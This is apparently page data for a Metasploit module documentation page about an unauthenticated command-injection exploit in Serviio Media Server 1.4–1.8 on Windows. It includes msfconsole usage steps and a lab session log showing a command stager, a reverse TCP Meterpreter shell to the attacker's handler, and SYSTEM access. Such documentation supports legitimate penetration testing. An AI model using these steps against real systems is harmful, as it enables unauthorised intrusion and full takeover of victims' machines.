{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/http/serviio_checkstreamurl_cmd_exec","result":{"data":{"moduleMetadataJson":{"id":"3cf28b4f-7a12-5937-b2c7-ccdfcf53cd4a","name":"Serviio Media Server checkStreamUrl Command Execution","fullname":"exploit/windows/http/serviio_checkstreamurl_cmd_exec","description":"This module exploits an unauthenticated remote command execution vulnerability\n        in the console component of Serviio Media Server versions 1.4 to 1.8 on\n        Windows operating systems.\n\n        The console service (on port 23423 by default) exposes a REST API which\n        which does not require authentication.\n\n        The 'action' API endpoint does not sufficiently sanitize user-supplied data\n        in the 'VIDEO' parameter of the 'checkStreamUrl' method. This parameter is\n        used in a call to cmd.exe resulting in execution of arbitrary commands.\n\n        This module has been tested successfully on Serviio Media Server versions\n        1.4.0, 1.5.0, 1.6.0 and 1.8.0 on Windows 7.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/windows/http/serviio_checkstreamurl_cmd_exec","documentationSlug":"/modules/documentation/exploit/windows/http/serviio_checkstreamurl_cmd_exec"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>  This module exploits an unauthenticated remote command execution vulnerability in the console component of <a href=\"http://serviio.org/\">Serviio Media Server</a> versions 1.4 to 1.8 on Windows operating systems.</p>\n<p>  The console service (on port 23423 by default) exposes a REST API which which does not require authentication.</p>\n<p>  The 'action' API endpoint does not sufficiently sanitize user-supplied data in the 'VIDEO' parameter of the 'checkStreamUrl' method. This parameter is used in a call to cmd.exe resulting in execution of arbitrary commands.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  Serviio is a free media server. It allows you to stream your media files (music, video or images) to renderer devices (e.g. a TV set, Bluray player, games console or mobile phone) on your connected home network.</p>\n<p>  Serviio is based on Java technology and therefore runs on most platforms, including Windows, Mac and Linux (incl. embedded systems, e.g. NAS).</p>\n<p>  This module has been tested successfully on Serviio Media Server versions 1.4.0, 1.5.0, 1.6.0 and 1.8.0 on Windows 7.</p>\n<p>  Installers:</p>\n<ul>\n<li><a href=\"http://download.serviio.org/releases/serviio-1.8-win-setup.exe\">serviio-1.8-win-setup.exe</a></li>\n<li><a href=\"http://download.serviio.org/releases/serviio-1.7-win-setup.exe\">serviio-1.7-win-setup.exe</a></li>\n<li><a href=\"http://download.serviio.org/releases/serviio-1.6-win-setup.exe\">serviio-1.6-win-setup.exe</a></li>\n<li><a href=\"http://download.serviio.org/releases/serviio-1.5-win-setup.exe\">serviio-1.5-win-setup.exe</a></li>\n<li><a href=\"http://download.serviio.org/releases/serviio-1.4-win-setup.exe\">serviio-1.4-win-setup.exe</a></li>\n</ul>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Do: <code class=\"language-text\">use exploit/windows/http/serviio_checkstreamurl_cmd_exec</code></li>\n<li>Do: <code class=\"language-text\">set rhost [IP]</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a session</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/windows/http/serviio_checkstreamurl_cmd_exec \nmsf exploit(serviio_checkstreamurl_cmd_exec) &gt; set rhost 172.16.191.166\nrhost =&gt; 172.16.191.166\nmsf exploit(serviio_checkstreamurl_cmd_exec) &gt; check\n[*] 172.16.191.166:23423 The target appears to be vulnerable.\nmsf exploit(serviio_checkstreamurl_cmd_exec) &gt; set verbose true\nverbose =&gt; true\nmsf exploit(serviio_checkstreamurl_cmd_exec) &gt; check\n\n[*] 172.16.191.166:23423 Serviio Media Server version 1.8\n[*] 172.16.191.166:23423 The target appears to be vulnerable.\nmsf exploit(serviio_checkstreamurl_cmd_exec) &gt; run\n\n[*] Started reverse TCP handler on 172.16.191.181:4444 \n[*] Serviio Media Server version 1.8\n[*] Command Stager progress -   7.95% done (7999/100636 bytes)\n[*] Command Stager progress -  15.90% done (15998/100636 bytes)\n[*] Command Stager progress -  23.85% done (23997/100636 bytes)\n[*] Command Stager progress -  31.79% done (31996/100636 bytes)\n[*] Command Stager progress -  39.74% done (39995/100636 bytes)\n[*] Command Stager progress -  47.69% done (47994/100636 bytes)\n[*] Command Stager progress -  55.64% done (55993/100636 bytes)\n[*] Command Stager progress -  63.59% done (63992/100636 bytes)\n[*] Command Stager progress -  71.54% done (71991/100636 bytes)\n[*] Command Stager progress -  79.48% done (79990/100636 bytes)\n[*] Command Stager progress -  87.43% done (87989/100636 bytes)\n[*] Command Stager progress -  95.38% done (95988/100636 bytes)\n[*] Sending stage (957487 bytes) to 172.16.191.166\n[*] Command Stager progress - 100.00% done (100636/100636 bytes)\n[*] Meterpreter session 1 opened (172.16.191.181:4444 -&gt; 172.16.191.166:58474) at 2017-05-05 02:49:39 -0400\n\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter &gt; pwd \nC:\\Program Files\\Serviio\\bin</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"3cf28b4f-7a12-5937-b2c7-ccdfcf53cd4a"}}}